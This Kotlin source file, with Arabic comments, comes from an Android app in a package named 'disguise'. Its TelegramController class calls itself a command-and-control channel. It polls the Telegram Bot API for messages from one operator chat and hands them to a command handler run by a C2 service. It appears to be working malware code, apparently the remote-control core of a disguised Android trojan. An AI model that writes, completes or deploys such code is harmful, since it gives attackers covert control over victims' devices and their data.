package com.example.disguise.core

import android.content.Context
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * TelegramController — قناة C2 عبر Telegram Bot API (Long Polling).
 *
 * المسؤوليات:
 * 1. استدعاء getUpdates بشكل دوري لقراءة الرسائل الجديدة.
 * 2. تحويل نص الرسالة إلى أمر مفهوم عبر CommandHandler.
 * 3. إرسال الردود عبر TelegramReporter (يُمرر كـ callback).
 * 4. تتبع offset لتجنب قراءة نفس الرسالة مرتين.
 *
 * ملاحظات:
 * - Long Polling: نستخدم timeout=30 في getUpdates لتقليل عدد الطلبات.
 * - OkHttpClient مشترك (singleton) لتقليل استهلاك الذاكرة.
 * - كل دورة pollOnce() تنتظر حتى انتهاء الطلب (suspend).
 */
class TelegramController(
    private val botToken: String,
    private val chatId: String,
    private val context: Context
) {

    companion object {
        private const val TAG = "TelegramController"
        private const val BASE_URL = "https://api.telegram.org/bot"
        private const val LONG_POLL_TIMEOUT = 30  // ثانية

        // عميل OkHttp مشترك مع timeouts مناسبة للـ Long Polling
        private val httpClient: OkHttpClient by lazy {
            OkHttpClient.Builder()
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout((LONG_POLL_TIMEOUT + 10).toLong(), TimeUnit.SECONDS)
                .writeTimeout(15, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build()
        }
    }

    // آخر update_id تمت معالجته (لتجنب التكرار)
    private var lastUpdateId: Long = 0L

    // معالج الأوامر (يُمرر من C2Service عبر setter أو في constructor)
    private var commandHandler: CommandHandler? = null

    // مرسل الردود (يُمرر من C2Service)
    private var reporter: TelegramReporter? = null

    /**
     * ربط CommandHandler و TelegramReporter.
     * يُستدعى من C2Service بعد إنشاء الكائن.
     */
    fun attach(handler: CommandHandler, reporter: TelegramReporter) {
        this.commandHandler = handler
        this.reporter = reporter
    }

    /**
     * دورة واحدة من Long Polling.
     * - تستدعي getUpdates مع offset = lastUpdateId + 1
     * - تمرر كل رسالة جديدة إلى CommandHandler
     * - تُحدّث lastUpdateId
     *
     * suspend: لأن C2Service يشغلها داخل coroutine.
     */
    suspend fun pollOnce() {
        val url = buildString {
            append(BASE_URL)
            append(botToken)
            append("/getUpdates?offset=")
            append(lastUpdateId + 1)
            append("&timeout=")
            append(LONG_POLL_TIMEOUT)
            append("&allowed_updates=[\"message\"]")
        }

        val request = Request.Builder().url(url).get().build()

        val body: String = withContext(Dispatchers.IO) {
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.e(TAG, "getUpdates HTTP ${response.code}")
                    return@withContext ""
                }
                response.body?.string() ?: ""
            }
        }

        if (body.isEmpty()) return

        parseAndDispatch(body)
    }

    /**
     * تحليل استجابة getUpdates وتوزيع الرسائل على CommandHandler.
     */
    private fun parseAndDispatch(body: String) {
        try {
            val root = JSONObject(body)
            if (!root.optBoolean("ok", false)) {
                Log.e(TAG, "getUpdates not ok: ${root.optString("description")}")
                return
            }

            val results: JSONArray = root.optJSONArray("result") ?: return
            for (i in 0 until results.length()) {
                val update = results.getJSONObject(i)
                val updateId = update.optLong("update_id", 0L)
                if (updateId > lastUpdateId) {
                    lastUpdateId = updateId
                }

                val message = update.optJSONObject("message") ?: continue
                val fromChatId = message.optJSONObject("chat")?.optString("id") ?: continue

                // نتجاهل أي رسالة من محادثة غير مصرح لها (أمان إضافي)
                if (fromChatId != chatId) {
                    Log.w(TAG, "ignored message from unauthorized chat: $fromChatId")
                    continue
                }

                val text = message.optString("text", "")
                if (text.isBlank()) continue

                Log.d(TAG, "received command: $text")
                dispatchCommand(text)
            }
        } catch (e: Exception) {
            Log.e(TAG, "parse error: ${e.message}", e)
        }
    }

    /**
     * تمرير الأمر إلى CommandHandler، مع التقاط أي استثناء
     * حتى لا تتوقف حلقة الـ polling.
     */
    private fun dispatchCommand(text: String) {
        val handler = commandHandler ?: run {
            Log.w(TAG, "CommandHandler not attached")
            return
        }
        try {
            handler.handle(text, reporter)
        } catch (e: Exception) {
            Log.e(TAG, "command execution error: ${e.message}", e)
            reporter?.sendMessage("⚠️ خطأ في تنفيذ الأمر: ${e.message}")
        }
    }

    /**
     * إرسال رسالة نصية بسيطة (اختصار للاستخدام الداخلي).
     */
    suspend fun sendSimple(text: String) {
        reporter?.sendMessage(text)
    }
}